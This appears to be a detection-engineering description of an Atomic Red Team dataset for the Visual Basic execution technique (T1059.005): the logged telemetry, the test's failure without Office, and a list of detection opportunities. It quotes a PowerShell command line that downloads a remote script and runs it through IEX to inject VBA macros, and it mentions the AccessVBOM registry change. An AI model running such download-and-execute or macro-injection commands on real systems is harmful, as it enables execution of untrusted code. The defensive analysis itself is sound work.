# T1059.005-2: Visual Basic — Encoded VBS code execution

## Technique Context

T1059.005 (Visual Basic) represents adversary execution of Visual Basic for Applications (VBA) macros or Visual Basic Script (VBS) files to run malicious code. This technique is fundamental to many initial access vectors, particularly through weaponized Office documents containing malicious macros. Attackers leverage VBA's extensive system interaction capabilities to download additional payloads, establish persistence, perform reconnaissance, and execute lateral movement activities. The detection community focuses heavily on monitoring Office application process spawning, VBA execution telemetry, and suspicious macro behaviors like network connections or process creation from Office applications.

## What This Dataset Contains

This dataset captures a PowerShell-based simulation of VBA macro execution using the Invoke-MalDoc framework. The primary evidence appears in Security event 4688, which shows PowerShell spawning with a full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"}`.

PowerShell event 4104 captures the complete Invoke-MalDoc function definition, which attempts to programmatically create Word documents with VBA macros. The function modifies registry keys (`AccessVBOM`), creates COM objects for Office applications, and injects VBA code. However, PowerShell event 4100 shows the technique failed with "Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered", indicating Microsoft Office is not installed on the test system.

Sysmon captures supporting process activity including PowerShell process creation (EID 1), .NET framework DLL loading (EID 7), DNS resolution for raw.githubusercontent.com (EID 22), and named pipe creation for PowerShell remoting (EID 17). The test also spawns whoami.exe for system discovery, captured in both Sysmon EID 1 and Security EID 4688.

## What This Dataset Does Not Contain

The dataset lacks actual VBA macro execution telemetry because Microsoft Office is not installed on the test system. This means there are no Office application process creations, no VBA runtime loading, no macro-to-process spawning chains, and no actual Visual Basic code execution. The dataset also contains no Office-specific registry modifications, embedded macro extraction artifacts, or AMSI (Anti-Malware Scan Interface) events that would typically accompany VBA execution. The Windows Defender events that would show macro scanning or blocking are absent since no Office document was actually processed.

## Assessment

This dataset provides limited value for detecting actual T1059.005 Visual Basic execution since the core technique failed due to missing Office applications. However, it offers excellent visibility into PowerShell-based macro simulation frameworks and demonstrates how attackers might programmatically interact with Office COM objects when Office is available. The PowerShell script block logging captures the complete Invoke-MalDoc source code, making this valuable for understanding macro injection methodologies and detecting similar frameworks. The command-line logging in Security events provides clear indicators of suspicious PowerShell usage patterns that could precede VBA execution attempts.

## Detection Opportunities Present in This Data

1. PowerShell command lines containing "Invoke-MalDoc" function calls or similar VBA manipulation frameworks
2. PowerShell accessing raw.githubusercontent.com or other code repositories to download macro-related scripts
3. PowerShell script blocks containing COM object creation patterns for Office applications (`New-Object -ComObject "Word.Application"`)
4. Registry modification attempts targeting Office VBA security settings (`AccessVBOM` registry keys)
5. PowerShell error patterns indicating failed COM object instantiation for Office applications
6. Process command lines containing combinations of "macroFile", "officeProduct", and script execution parameters
7. PowerShell downloading and immediately executing scripts from known penetration testing repositories
8. Named pipe creation patterns associated with PowerShell remoting during suspected macro execution attempts
